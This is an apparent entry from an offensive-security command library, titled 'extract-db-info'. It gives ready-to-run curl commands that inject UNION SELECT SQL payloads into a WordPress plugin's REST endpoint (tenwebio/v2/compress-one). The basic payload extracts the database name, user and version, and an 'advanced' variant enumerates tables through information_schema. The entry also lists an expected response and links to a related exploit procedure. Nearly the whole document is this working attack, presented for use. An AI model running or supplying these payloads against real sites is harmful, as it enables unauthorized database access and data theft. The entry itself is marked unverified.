---
data: >-
  curl -X POST 'https://target.com/wp-json/tenwebio/v2/compress-one' -d
  'param=\' UNION SELECT database(),user(),version() --' -H 'Content-Type:
  application/json'
tags:
  - sqli
  - enumeration
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:05.393Z'
id: 99c341aa-f6ba-4c42-98dd-edf2ed07588d
verified: false
validated: true
submitted: true
---
# extract-db-info

## Command

```bash
curl -X POST 'https://target.com/wp-json/tenwebio/v2/compress-one' -d 'param=\' UNION SELECT database(),user(),version() --' -H 'Content-Type: application/json'
```

## Description

This command uses a UNION SELECT payload to extract database metadata via SQL injection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-d 'param=...'` | UNION payload for data extraction | Yes |
| `-H` | Header for request type | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://target.com/wp-json/tenwebio/v2/compress-one' -d 'param=\' UNION SELECT database(),user(),version() --' -H 'Content-Type: application/json'
```

### Advanced Usage

```bash
curl -X POST 'https://target.com/wp-json/tenwebio/v2/compress-one' -d 'param=\' UNION SELECT table_name FROM information_schema.tables --' -H 'Content-Type: application/json'
```

## Expected Output

Response embedding database info, e.g., {"data":"krisp_db|wp_user|5.7.32"}.

## Related

- [[Related Procedure: Exploit-SQL-Injection-in-TenWeb-API-Endpoint]]
